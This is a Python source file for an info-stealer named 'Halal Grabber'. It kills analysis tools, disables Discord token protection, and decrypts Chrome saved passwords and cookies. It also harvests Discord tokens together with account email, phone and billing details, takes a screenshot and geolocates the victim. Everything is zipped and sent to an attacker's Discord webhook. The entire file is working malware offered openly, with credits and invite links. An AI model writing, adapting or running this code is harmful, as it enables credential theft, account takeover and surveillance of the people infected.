import requests
import os 
import shutil 
import sqlite3 
import zipfile 
import json 
import base64 
import psutil 
import pyautogui
import sys
from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES
import psutil

#0V4TEAM || https://discord.gg/aRru2PtJxN
#DONT SKID!!

PROCNAME = "ProcessHacker.exe"
PROCNAME = "httpdebuggerui.exe"
print("Loading client...")
PROCNAME = "wireshark.exe"
PROCNAME = "fiddler.exe"
PROCNAME = "regedit.exe"
PROCNAME = "cmd.exe"
PROCNAME = "taskmgr.exe"
PROCNAME = "vboxservice.exe"
PROCNAME = "df5serv.exe"
PROCNAME = "processhacker.exe"
PROCNAME = "vboxtray.exe"
PROCNAME = "vmtoolsd.exe"
PROCNAME = "vmwaretray.exe"
PROCNAME = "ida64.exe"
PROCNAME = "ollydbg.exe"
PROCNAME = "pestudio.exe"
PROCNAME = "vmwareuser.exe"
PROCNAME = "vgauthservice.exe"
PROCNAME = "vmacthlp.exe"
PROCNAME = "vmsrvc.exe"
PROCNAME = "x32dbg.exe"
PROCNAME = "x64dbg.exe"
PROCNAME = "x96dbg.exe"
PROCNAME = "vmusrvc.exe"
PROCNAME = "prl_cc.exe"
PROCNAME = "prl_tools.exe"
PROCNAME = "qemu-ga.exe"
PROCNAME = "joeboxcontrol.exe"
PROCNAME = "ksdumperclient.exe"
PROCNAME = "xenservice.exe"
PROCNAME = "joeboxserver.exe"


for proc in psutil.process_iter():
    # check whether the process name matches
    if proc.name() == PROCNAME:
        proc.kill()

def get_base_prefix_compat():
    return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

def in_virtualenv(): 
    return get_base_prefix_compat() != sys.prefix

if in_virtualenv() == True:
    sys.exit() # exit

async def killProcesses(self):
        blackListedPrograms = self.fetchConf('blackListedPrograms')
        for i in ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']:
            blackListedPrograms.append(i)
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in blackListedPrograms):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
class Synful:
    def __init__(self):
        self.webhook = "WEBHOOKHERE"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Synthetic"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.saved = []

        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
            self.bypass_better_discord()

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** they dont have it installed\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
        self.screenshot()
        self.SendInfo()
        self.LogOut()
        try:
            shutil.rmtree(self.tempfolder)
        except (PermissionError, FileExistsError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    async def bypassTokenProtector(self):
        # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Halal_shit_on_your_prot'] = "https://discord.gg/aRru2PtJxN"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Halal Just shit on your protection | https://discord.gg/aRru2PtJxN ")


    def bypass_better_discord(self):
        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
        with open(bd, "rt", encoding="cp437") as f:
            content = f.read()
            content2 = content.replace("api/webhooks", "SyntheGoat")
        with open(bd, 'w'): pass
        with open(bd, "wt", encoding="cp437") as f:
            f.write(content2)

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google-Passwords.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made By synthetic#2958 | https://discord.gg/GWE3EDbf ")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUsername: {username}\nPassword: {decrypted_password}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\google-cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("W 0V4Basement | https://discord.gg/GWE3EDbf")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"Host: {Host}\nUsername: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord-Info.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by synthetic#2958 | https://discord.gg/GWE3EDbf")
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            self.tokens.append(token)
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Dev, "
                if (badges == ""):
                    badges = "None"

                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"]
                phone = j["phone"] if j["phone"] else "No phone"

                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    url = url[:-4]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nMetodos de Pago: {billing}\nNitro: {has_nitro}\nInsignias: {badges}\nEmail: {email}\nTelefono: {phone}\n[Avatar]({url})\n\n")
        f.close()


    def screenshot(self):
        image = pyautogui.screenshot()
        image.save(self.tempfolder + "\\Screenshot.png")

    def SendInfo(self):
        ip = country = city = region = googlemap = "None"
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except Exception:
            pass
        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'Halal-[{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Found Files: "
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png",
            "embeds": [
                {
                    "author": {
                        "name": "Halal Grabber",
                        "url": "https://discord.gg/aRru2PtJxN",
                        "icon_url": "https://cdn.discordapp.com/attachments/990380279988363264/990385752053534770/unknown.png"
                    },
                    "description": f"The User **{os.getlogin()}** Has Just Opened Halal Grabber\n```diff\n- Computer Name: {os.getenv('COMPUTERNAME')}\n- IP: {ip}\n- City: {city}\n- Region: {region}\n- Country: {country}``` ```\n{self.fileCount}{self.files}``` [Location Google Maps]({googlemap})",
                    "color": 15277667,

                    "thumbnail": {
                      "url": "https://discord.gg/aRru2PtJxN"
                    },       

                    "footer": {
                      "text": "W 0V4BASEMENT| https://discord.gg/GWE3EDbf"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})
        requests.post(self.examplewebhooknotactive, json=embed)
        requests.post(self.examplewebhooknotactive, files={'upload_file': open(new,'rb')})

    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

if __name__ == "__main__":
    Synful()
